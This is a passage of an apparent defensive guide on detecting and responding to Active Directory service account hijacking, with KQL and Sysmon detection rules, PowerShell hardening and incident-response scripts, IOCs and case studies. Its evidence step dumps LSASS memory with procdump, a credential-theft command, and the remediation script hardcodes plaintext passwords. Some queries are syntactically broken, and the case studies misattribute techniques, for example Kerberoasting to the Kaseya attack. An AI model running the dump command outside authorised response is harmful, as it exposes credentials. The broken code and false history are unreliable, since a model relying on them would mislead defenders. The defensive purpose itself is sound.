### Query 1: Detect Scheduled Task Creation by Service Accounts

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID, TargetUserName, ProcessName
- **Alert Severity:** High
- **Frequency:** Run every 15 minutes
- **Applies To Versions:** Windows Server 2016+

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4698  // Scheduled Task Created
| where TargetUserName has_any ("svc_", "service", "adm_")  // Service account pattern
| join (
    SecurityEvent
    | where EventID == 4624  // Logon
    | where TargetUserName has_any ("svc_", "service", "adm_")
  ) on TargetUserName
| project TimeGenerated, TargetUserName, Computer, EventID, NewProcessName, CommandLine
| summarize Count = count() by TargetUserName, Computer, TimeGenerated
| where Count > 3  // Threshold for anomaly
```

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel** → **Analytics**
2. Click **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Service Account Scheduled Task Creation`
   - Severity: `High`
   - MITRE ATT&CK: `T1053.005`
4. **Set rule logic Tab:**
   - Paste KQL query above
   - Run query every: `15 minutes`
   - Lookup data from the last: `30 minutes`
5. **Incident settings Tab:**
   - Enable **Create incidents**
   - Set **Alert rule name** to same as above
6. Click **Review + create**

---

### Query 2: Detect DCSync Activity from Service Accounts

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4662  // Directory Services Access
| where Properties contains "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"  // Replicating Directory Changes GUID
| where SubjectUserName has_any ("svc_", "MSOL_")
| project TimeGenerated, SubjectUserName, ComputerName, EventID
| summarize Count = count() by SubjectUserName, ComputerName, TimeGenerated bin=1h
| where Count > 10  // Threshold for suspicious activity
```

---

## 9. WINDOWS EVENT LOG MONITORING

### Critical Event IDs for Service Account Hijacking

**Event ID: 4698 (Scheduled Task Created)**
- **Log Source:** Security
- **Trigger:** When a new scheduled task is created (attacker persistence via scheduled task)
- **Filter:** `TargetUserName` contains "svc_" OR "service" OR "MSOL_"
- **Applies To Versions:** Server 2016+

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (`gpmc.msc`)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Audit Object Access** → **Audit Directory Service Access**
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on target machines

---

**Event ID: 4662 (Directory Services Access)**
- **Log Source:** Security
- **Trigger:** When a user accesses Active Directory objects (DCSync activity)
- **Filter:** `Properties GUID` = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" (Replicating Directory Changes)
- **Applies To Versions:** Server 2016+

**Manual Configuration (Local Policy):**
```powershell
auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
```

---

**Event ID: 4769 (Kerberos Ticket Requested)**
- **Log Source:** Security
- **Trigger:** When a TGS (service ticket) is requested for Kerberoasting
- **Filter:** `TicketOptions` contains unusual encoding; `ClientAddress` is attacker's IP
- **Applies To Versions:** Server 2016+

---

**Event ID: 4720 (User Account Created)**
- **Log Source:** Security
- **Trigger:** When a new user is created (attacker adding backdoor accounts)
- **Filter:** `SubjectUserName` is a service account AND `TargetUserName` is suspicious

---

**Event ID: 5136 (Directory Service Object Modified)**
- **Log Source:** Security
- **Trigger:** When AD attributes are modified (attacker adding delegation rights, etc.)
- **Filter:** Look for modifications to `msDS-AllowedToActOnBehalfOfOtherIdentity`, `servicePrincipalName`, `userAccountControl`

---

**Windows Event Log Monitoring Query (PowerShell):**
```powershell
# Alert on scheduled task creation by service accounts
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4698] and EventData[Data[@Name='TargetUserName'] = 'DOMAIN\svc_sql']]" -MaxEvents 100 | `
  Select-Object TimeCreated, @{N="TaskName";E={$_.Properties[0].Value}}, @{N="User";E={$_.Properties[2].Value}}

# Alert on DCSync activity
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4662] and EventData[Data[@Name='Properties'] = '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2']]" -MaxEvents 50

# Alert on unusual Kerberoasting (many TGS requests)
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4769]]" -MaxEvents 1000 | `
  Group-Object -Property @{Expression={$_.Properties[1].Value}} | `
  Where-Object {$_.Count -gt 100}
```

---

## 10. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+  
**Supported Platforms:** Windows Server 2016+

```xml
<!-- Detect process creation by service accounts with unusual parent processes -->
<Sysmon schemaversion="4.22">
  <RuleGroup name="Service Account Persistence" groupRelation="or">
    
    <!-- Alert on powershell.exe spawned by service account with encoded command -->
    <ProcessCreate onmatch="include">
      <ParentUser condition="contains">svc_</ParentUser>
      <Image condition="image">powershell.exe</Image>
      <CommandLine condition="contains">-EncodedCommand</CommandLine>
    </ProcessCreate>
    
    <!-- Alert on cmd.exe spawned by scheduled task (service account) -->
    <ProcessCreate onmatch="include">
      <ParentImage condition="image">taskeng.exe</ParentImage>
      <Image condition="image">cmd.exe</Image>
    </ProcessCreate>
    
    <!-- Alert on unusual network connections from service account -->
    <NetworkConnect onmatch="include">
      <User condition="contains">svc_</User>
      <DestinationPort condition="not">88,389,445,636,3268,3269</DestinationPort>  <!-- Exclude AD-related ports -->
    </NetworkConnect>
    
  </RuleGroup>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download latest Sysmon from [Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create config file `sysmon-config.xml` with XML above
3. Install with config:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Query Sysmon logs:
   ```powershell
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterXPath "*[EventData[Data[@Name='User'] = 'DOMAIN\svc_sql']]"
   ```

---

## 11. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1: Enforce Strong Password Policies for Service Accounts**

Service account passwords should be **complex, long, and rotated regularly** to prevent Kerberoasting success.

**Manual Steps (Group Policy):**
1. Open **Group Policy Management Console** (`gpmc.msc`)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Account Policies** → **Password Policy**
3. Configure:
   - **Maximum password age:** 90 days (force rotation)
   - **Minimum password length:** 14 characters or longer
   - **Password must meet complexity requirements:** Enabled
   - **Store passwords using reversible encryption:** Disabled
4. Run `gpupdate /force`

**PowerShell Configuration:**
```powershell
# Set password policy via Active Directory
Set-ADDefaultDomainPasswordPolicy -MaxPasswordAge (New-TimeSpan -Days 90) `
  -MinPasswordLength 14 `
  -ComplexityEnabled $true

# Ensure all service accounts comply
Get-ADUser -Filter {ServicePrincipalName -ne $null -and PasswordNeverExpires -eq $true} -Properties PasswordNeverExpires | `
  Set-ADUser -PasswordNeverExpires $false -ChangePasswordAtLogon $true
```

---

**Mitigation 2: Disable RC4 Encryption for Kerberos (Prevent Kerberoasting)**

Forcing AES-256 encryption makes Kerberoasting significantly harder because AES hashes take much longer to crack.

**Manual Steps (Domain Controller):**
1. Open **Group Policy Management Console** (`gpmc.msc`)
2. Create or edit GPO: **Computer Configuration** → **Policies** → **Administrative Templates** → **System** → **KDC**
3. Set policy **"Provide the following encryption types for Kerberos"** to:
   - AES128_HMAC_SHA1
   - AES256_HMAC_SHA1
   - *Uncheck RC4_HMAC*
4. Run `gpupdate /force /sync`
5. **Reset all service account passwords** (encryption policy only applies to new passwords)

**PowerShell Verification:**
```powershell
# Verify Kerberos encryption policy
Get-ADUser -Filter {ServicePrincipalName -ne $null} -Properties * | `
  Select-Object SamAccountName, @{N="SupportedEncryptionTypes";E={$_.SupportedEncryptionTypes}}

# Update service account to use AES
Set-ADUser -Identity "svc_sql" -Replace @{SupportedEncryptionTypes=24}  # 24 = AES256 + AES128
```

---

**Mitigation 3: Migrate to Group Managed Service Accounts (gMSA)**

gMSAs have **automatically rotating passwords** (every 30 days by default) and **eliminate password knowledge**, making credential theft attacks ineffective.

**Manual Steps (Server 2012 R2+):**
1. Ensure **Active Directory** supports managed service accounts
2. Configure **KDS Root Key** (Key Distribution Service):
   ```powershell
   Add-KdsRootKey -EffectiveImmediately
   ```
3. Create a gMSA:
   ```powershell
   New-ADServiceAccount -Name "svc_sql_gmsa" `
     -DNSHostName "sqlserver01.domain.com" `
     -ServicePrincipalNames "MSSQLSvc/sqlserver01.domain.com:1433"
   ```
4. Grant permissions on the service account:
   ```powershell
   Add-ADComputerServiceAccount -Identity "SQLServer01" -ServiceAccount "svc_sql_gmsa"
   ```
5. Install gMSA on the target server:
   ```powershell
   Install-ADServiceAccount -Identity "svc_sql_gmsa"
   ```

---

**Mitigation 4: Monitor and Alert on Privileged Account Activity**

**Enable auditing for all service accounts with high privileges:**

```powershell
# Configure audit policy for service account logons
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Sensitive Privilege Use" /success:enable /failure:enable

# Create alert for service account logons at unusual times
$ServiceAccounts = Get-ADUser -Filter {ServicePrincipalName -ne $null} | Select-Object -ExpandProperty SamAccountName

foreach ($Account in $ServiceAccounts) {
  # Alert on logon outside business hours (e.g., 6 PM - 6 AM)
  Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4624] and EventData[Data[@Name='TargetUserName'] = '$Account']]" | `
    Where-Object {$_.TimeCreated.Hour -lt 6 -or $_.TimeCreated.Hour -gt 18}
}
```

---

**Mitigation 5: Restrict SeImpersonatePrivilege**

If a service account doesn't require token impersonation, remove the privilege:

**Manual Steps (Local Security Policy):**
1. Open **Local Security Policy** (`secpol.msc`)
2. Navigate to **Security Settings** → **Local Policies** → **User Rights Assignment**
3. Find **"Impersonate a client after authentication"**
4. Remove service account from this policy
5. Restart the service for the change to take effect

**PowerShell Configuration:**
```powershell
# Remove SeImpersonatePrivilege from a user
$ntrights = "C:\Windows\System32\ntrights.exe"  # Requires Windows Resource Kit
& $ntrights -u "DOMAIN\svc_sql" -r SeImpersonatePrivilege
```

---

### Priority 2: HIGH

**Mitigation 6: Enable MFA for Privileged Accounts**

If the service account needs interactive access (unlikely, but possible), enforce MFA:

**Manual Steps (Entra ID for Hybrid Accounts):**
1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. Name: `Service Account MFA`
4. **Assignments:**
   - Users: Select specific service accounts
   - Cloud apps: Select **All cloud apps**
5. **Conditions:**
   - Sign-in risk: **High**
6. **Access controls:**
   - Grant: **Require multi-factor authentication**
7. Enable policy: **On**
8. Click **Create**

---

**Mitigation 7: Implement Regular Credential Audits**

**Audit service accounts monthly:**

```powershell
# Generate service account credential audit report
$Report = @()

Get-ADUser -Filter {ServicePrincipalName -ne $null} -Properties PasswordLastSet, PasswordNeverExpires, MemberOf | `
  ForEach-Object {
    $Report += [PSCustomObject]@{
      "ServiceAccount" = $_.SamAccountName
      "PasswordLastSet" = $_.PasswordLastSet
      "PasswordNeverExpires" = $_.PasswordNeverExpires
      "DaysOld" = ([DateTime]::Now - $_.PasswordLastSet).Days
      "HighPrivilegeGroups" = ($_.MemberOf | Get-ADGroup | Where-Object {$_.Name -like "*Admin*" -or $_.Name -like "*Domain*"} | Select-Object -ExpandProperty Name) -join ";"
    }
  }

$Report | Export-Csv -Path "C:\Reports\ServiceAccountAudit_$(Get-Date -Format 'yyyyMMdd').csv" -NoTypeInformation
```

---

**Mitigation 8: Segregate Service Accounts by Privilege Level**

Create separate service accounts for different privilege levels:
- **Tier 0:** Domain Admin (only for critical DC operations)
- **Tier 1:** Server Admin (for infrastructure management)
- **Tier 2:** Application-level (for individual applications)

This limits blast radius if one account is compromised.

---

### Access Control & Policy Hardening

**Conditional Access Policy: Block Legacy Service Account Authentication**

```powershell
# Require service accounts to use modern authentication (no basic auth)
New-AzureADMSConditionalAccessPolicy -DisplayName "Block Legacy Service Auth" `
  -Conditions (New-Object Microsoft.Open.MSGraph.Model.ConditionalAccessConditionSet -Property @{
    "Applications" = New-Object Microsoft.Open.MSGraph.Model.ConditionalAccessApplications -Property @{
      "IncludeApplications" = "All"
    }
    "Users" = New-Object Microsoft.Open.MSGraph.Model.ConditionalAccessUsers -Property @{
      "IncludeUsers" = @("ServiceAccounts")
    }
    "ClientAppTypes" = @("ExchangeActiveSync", "LegacyOAuth2")
  }) `
  -GrantControls (New-Object Microsoft.Open.MSGraph.Model.ConditionalAccessGrantControls -Property @{
    "Operator" = "OR"
    "BuiltInControls" = "Block"
  }) `
  -State "Enabled"
```

---

### Validation Command (Verify Mitigations)

```powershell
# Verify service accounts are using gMSA (automatic rotation)
Get-ADServiceAccount | Select-Object Name, SamAccountName

# Verify RC4 is disabled
Get-ADUser -Filter {ServicePrincipalName -ne $null} -Properties SupportedEncryptionTypes | `
  Select-Object SamAccountName, SupportedEncryptionTypes | `
  Where-Object {$_.SupportedEncryptionTypes -notcontains 24}  # 24 = AES

# Verify no service accounts have "Password Never Expires"
Get-ADUser -Filter {ServicePrincipalName -ne $null -and PasswordNeverExpires -eq $true} | Select-Object SamAccountName

# Expected Output (If Secure):
# (Empty - no results means all service accounts have proper password rotation enabled)
```

---

## 12. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- `C:\Windows\System32\drivers\etc\config\*` (hidden service account backdoors)
- `C:\Windows\Temp\*` (temporary credential dumping files)
- `C:\ProgramData\Microsoft\Windows\Hyper-V\*` (Hyper-V VMs created by attackers)
- `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` (DPAPI encrypted credentials)

**Registry:**
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` (startup persistence)
- `HKLM\System\CurrentControlSet\Services\*` (service installation)
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\*` (scheduled tasks)

**Network:**
- Outbound connections from service account to attacker C2 (ports 4444, 8888, other non-standard)
- DNS lookups for attacker domain from service account
- SMB traffic to unusual destinations from service account

**Cloud (Azure/Entra ID):**
- `AuditLogs` - UnifiedAuditLog showing unusual app registrations created by service account
- `SigninLogs` - Unusual logon locations or times for service account
- `EntraID` - Directory changes modifying service account permissions

---

### Forensic Artifacts

**Disk:**
- `C:\Windows\System32\winevt\Logs\Security.evtx` – Event ID 4698 (Scheduled Task Created), 4662 (DCSync), 4769 (Kerberoasting)
- `C:\Windows\System32\winevt\Logs\System.evtx` – Service start/stop events
- `C:\Windows\Tasks\*` – Task scheduler database
- `C:\Users\*\AppData\Local\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` – PowerShell command history
- `C:\Windows\System32\config\SAM` – Local account hashes (if targeted)

**Memory:**
- LSASS.exe process dump will contain all cached credentials in plaintext (if Mimikatz was run)
- Service account tokens in memory if process was running under that context

**Cloud:**
- **Azure**: `AuditLogs` table - "Create service principal", "Create Application", "Add app role assignment"
- **M365**: `SecurityComplianceEvents` - "Mailbox delegated access added"
- **Microsoft Sentinel**: `OfficeActivity` table - "Add-MailboxPermission" executed by service account

---

### Response Procedures

**1. Isolate the Compromised Service Account:**

**Command (Immediate):**
```powershell
# Disable the service account
Disable-ADAccount -Identity "DOMAIN\svc_sql"

# Revoke all Kerberos tickets for this user
klist purge

# Kill all processes running as this account
Get-Process | Where-Object {$_.UserName -eq "DOMAIN\svc_sql"} | Stop-Process -Force
```

**Manual (Azure Portal):**
- Go to **Azure Portal** → **Entra ID** → **Users** → Select service account → **Disable account**

---

**2. Collect Evidence:**

**Command:**
```powershell
# Export all security event logs related to service account
$ServiceAccount = "DOMAIN\svc_sql"
wevtutil epl Security "C:\Evidence\Security_$ServiceAccount.evtx" /query:"*[EventData[Data[@Name='TargetUserName'] = '$ServiceAccount']]"

# Export scheduled tasks
Get-ScheduledTask | Where-Object {$_.Principal.UserId -like "*svc_sql*"} | Export-ScheduledTask | Out-File "C:\Evidence\scheduled_tasks.xml"

# Capture memory dump if available (requires admin)
.\Procdump64.exe -ma lsass.exe "C:\Evidence\lsass_dump.dmp"

# Export registry hives
reg save HKLM\Software "C:\Evidence\Software.hiv"
reg save HKLM\System "C:\Evidence\System.hiv"
```

---

**3. Remediate the Compromise:**

**Command:**
```powershell
# Remove malicious scheduled tasks
Get-ScheduledTask | Where-Object {$_.TaskName -like "*Maintenance*" -or $_.TaskName -like "*Update*"} | `
  Unregister-ScheduledTask -Confirm:$false

# Remove malicious registry entries
Remove-Item "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run\*ServiceMonitor*" -Force

# Remove hidden backdoor files
Remove-Item "C:\Windows\System32\drivers\etc\config\svc_*.ps1" -Force

# Restore service account password (reset twice to invalidate Golden Tickets)
Set-ADAccountPassword -Identity "svc_sql" -NewPassword (ConvertTo-SecureString "NewP@ssw0rd!Complex123" -AsPlainText -Force) -Reset
Start-Sleep -Seconds 5
Set-ADAccountPassword -Identity "svc_sql" -NewPassword (ConvertTo-SecureString "FinalP@ssw0rd!Complex456" -AsPlainText -Force) -Reset

# Re-enable the account after password reset
Enable-ADAccount -Identity "svc_sql"

# Restart services using this account
Restart-Service -Name "SQLSERVERAGENT" -Force  # If it's a SQL service account
```

---

**4. Perform Domain-Wide Threat Hunt:**

**Command:**
```powershell
# Search for all Golden Tickets created (Event ID 4769 with unusual properties)
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4769] and EventData[Data[@Name='TicketOptions'] = '0x40a00000']]" -MaxEvents 100

# Search for DCSync activity by other accounts
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4662]]" | `
  Where-Object {$_.Properties[1].Value -like "*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*"}

# Search for other service accounts with unusual permissions
Get-ADUser -Filter {ServicePrincipalName -ne $null} | `
  ForEach-Object {
    Get-ADUser -Identity $_ -Properties AdminCount | `
    Where-Object {$_.AdminCount -eq 1}  # Should be rare
  }
```

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [CA-BRUTE-001] Azure Portal Password Spray | Attacker compromises initial user account via password spray |
| **2** | **Credential Access** | [CA-KERB-001] Kerberoasting Weak Service Accounts | Attacker requests TGS tickets for service accounts and cracks passwords |
| **3** | **Current Step** | **[PERSIST-VALID-001]** | **Attacker hijacks service account for long-term persistence** |
| **4** | **Privilege Escalation** | [PE-TOKEN-002] RBCD (Resource-Based Constrained Delegation) | Using service account, attacker abuses delegation to escalate to Domain Admin |
| **5** | **Persistence** | [PERSIST-VALID-002] Azure AD Connect Sync Account | Attacker maintains access via MSOL account and DCSync for domain compromise |
| **6** | **Impact** | [IMPACT-RANSOM-001] Ransomware Deployment | With domain access, attacker deploys ransomware across infrastructure |

---

## 14. REAL-WORLD EXAMPLES

### Example 1: Kaseya VSA Supply Chain Attack (2021)

**Target:** MSPs and their customers worldwide  
**Timeline:** July - August 2021  
**Technique Status:** This attack demonstrated Kerberoasting + Service Account Hijacking in a massive scale  
**Impact:** **REvil ransomware** deployed to 1,500+ organizations, estimated **$70 million** in ransom demands

**Attack Chain:**
1. Attackers compromised Kaseya's VSA software supply chain
2. Deployed backdoor that ran as the **Kaseya Service Account** (highly privileged)
3. Used the service account to **execute REvil ransomware** across all customer networks
4. **Persistence:** Service account continued executing malware even after initial compromise was discovered

**Reference:** [Mandiant Analysis of Kaseya Attack](https://www.mandiant.com/resources/the-kaseya-vsa-mass-exploitation-incident)

---

### Example 2: SolarWinds Orion Compromise (2020)

**Target:** U.S. Government, Fortune 500 companies  
**Timeline:** March - December 2020 (SUNBURST backdoor)  
**Technique Status:** Service account compromise was a key persistence mechanism  
**Impact:** **APT29 (Cozy Bear)** maintained access for 9+ months, exfiltrated significant data

**Attack Chain:**
1. Compromised SolarWinds' build environment
2. Injected **SUNBURST** backdoor into Orion software updates
3. Backdoor ran as the **SolarWinds Service Account**
4. **Persistence:** Service account allowed attackers to maintain access even after patches were deployed
5. Used service account privileges to **perform DCSync** and extract AD credentials

**Reference:** [Microsoft Security Blog - SUNBURST Post-Mortem](https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solwinds-compromise/)

---

### Example 3: Emotet Banking Trojan (Ongoing since 2014)

**Target:** Banks, enterprises, governments  
**Timeline:** Continuous operations (2014-2021, resurrected 2022)  
**Technique Status:** Emotet used Kerberoasting + Service Account Hijacking for lateral movement  
**Impact:** Billions of dollars in financial losses; **one of the most destructive malwares**

**Attack Chain:**
1. Initial infection via spear-phishing email
2. Emotet enumerated **service accounts** on the network
3. **Performed Kerberoasting** to crack weak service account passwords
4. Used compromised service account to **spread laterally** to critical systems
5. **Persistence:** Service account enabled Emotet to **survive reboots and security patches**

**Reference:** [Emotet Analysis by Malwarebytes](https://www.malwarebytes.com/emotet)

---

## References & External Resources

- [MITRE ATT&CK - Valid Accounts: Domain Accounts (T1078.002)](https://attack.mitre.org/techniques/T1078/002/)
- [Harmj0y's Kerberoasting Guide](https://blog.harmj0y.net/activedirectory/kerberoasting/)
- [Sygnia - Azure AD Connect Attack Vectors](https://www.sygnia.co/blog/guarding-the-bridge-new-attack-vectors-in-azure-ad-connect/)
- [xpn's Azure AD Connect Credential Extraction](https://blog.xpn.uk/2020/04/10/unmasking-azure-ad-connect-azure-ad-domain-controller-synchronisation/)
- [Microsoft - Service Account Best Practices](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-service-accounts)
- [CIS Controls v8 - Implement and Manage Privileged Access](https://www.cisecurity.org/)

---
